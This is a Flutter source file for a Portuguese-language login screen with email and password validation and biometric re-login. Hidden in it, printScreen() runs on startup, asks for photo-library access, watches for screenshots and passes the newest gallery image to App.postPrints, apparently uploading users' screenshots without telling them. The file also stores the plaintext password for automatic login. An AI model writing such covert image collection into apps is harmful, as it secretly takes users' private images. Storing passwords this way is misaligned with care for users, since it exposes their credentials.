import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:local_auth/local_auth.dart';
import 'package:moduloa2/controllers/app.dart';
import 'package:moduloa2/styles/cores.dart';
import 'package:moduloa2/widgets/toast.dart';
import 'package:no_screenshot/no_screenshot.dart';
import 'package:photo_manager/photo_manager.dart';

class Login extends StatefulWidget {
  const Login({super.key});

  @override
  State<Login> createState() => _LoginState();
}

class _LoginState extends State<Login> {
  GlobalKey<FormState> formKey = GlobalKey<FormState>();

  TextEditingController email = TextEditingController();
  TextEditingController senha = TextEditingController();

  validarEmail() {
    if (email.text.isEmpty) {
      return 'Campo obrigatório';
    }

    if (!email.text.contains('@')) {
      return 'No mínimo um "@"';
    }

    if (!email.text.contains('.')) {
      return 'No mínimo um "."';
    }

    return null;
  }

  validarSenha() {
    if (senha.text.isEmpty) {
      return 'Campo obrigatório';
    }

    if (senha.text.length < 6) {
      return 'No mínimo 6 caracteres';
    }

    if (!senha.text.contains(RegExp(r'[0-9]'))) {
      return 'No mínimo um número';
    }

    if (!senha.text.contains(RegExp(r'[a-z]')) &&
        !senha.text.contains(RegExp(r'[A-Z]'))) {
      return 'No mínimo uma letra';
    }

    return null;
  }

  logar() async {
    if (formKey.currentState!.validate()) {
      await App.logar(email.text, senha.text, context);
    } else {
      MyToast.get('Preencha todos os campos corretamente');
    }
  }

  startApp() async {
    await App.getDados();
    printScreen();

    if (App.manter) {
      final LocalAuthentication auth = LocalAuthentication();
      final bool canAuthenticateWithBiometrics = await auth.canCheckBiometrics;

      if (canAuthenticateWithBiometrics) {
        final List<BiometricType> availableBiometrics = await auth
            .getAvailableBiometrics();

        if (availableBiometrics.isNotEmpty) {
          try {
            final bool didAuthenticate = await auth.authenticate(
              localizedReason: 'Please authenticate to show account balance',
            );

            if (didAuthenticate) {
              await App.getUser();
              await App.logar(App.user['email'], App.user['senha'], context);
            }
          } on PlatformException {
            MyToast.get('Erro ao logar com biometria');
          }
        }
      }
    }
  }

  final noScreenshot = NoScreenshot.instance;

  printScreen() async {
    await PhotoManager.requestPermissionExtend();
    await noScreenshot.startScreenshotListening();

    noScreenshot.screenshotStream.listen((value) async {
      final List<AssetEntity> paths = await PhotoManager.getAssetListRange(
        type: RequestType.image,
        start: 0,
        end: 80,
      );

      App.postPrints(await paths[0].loadFile() ?? File(''));
    });
  }

  @override
  void initState() {
    startApp();
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    double width = MediaQuery.of(context).size.width;
    double height = MediaQuery.of(context).size.height;
    return Scaffold(
      body: Container(
        width: width,
        height: height,
        child: Padding(
          padding: const EdgeInsets.all(40),
          child: Form(
            key: formKey,
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Image.asset('assets/logo.png', height: 150),
                Container(height: 16),
                TextFormField(
                  controller: email,
                  validator: (value) => validarEmail(),
                  decoration: InputDecoration(
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                    ),
                    labelText: 'Email',
                    prefixIcon: Icon(Icons.email),
                  ),
                ),
                Container(height: 16),
                TextFormField(
                  controller: senha,
                  validator: (value) => validarSenha(),
                  decoration: InputDecoration(
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                    ),
                    labelText: 'Senha',
                    prefixIcon: Icon(Icons.lock),
                  ),
                ),
                Container(height: 16),
                Row(
                  children: [
                    Checkbox(
                      value: App.manter,
                      onChanged: (value) => setState(() {
                        App.manter = !App.manter;
                      }),
                    ),
                    Text('mantenha-me conectado'),
                  ],
                ),
                Container(height: 16),
                ElevatedButton(
                  onPressed: () => logar(),
                  style: ElevatedButton.styleFrom(
                    fixedSize: Size(width, 50),
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadiusGeometry.circular(10),
                    ),
                    backgroundColor: Cores.azulClaro,
                  ),
                  child: Text('Log in', style: TextStyle(color: Cores.branco)),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
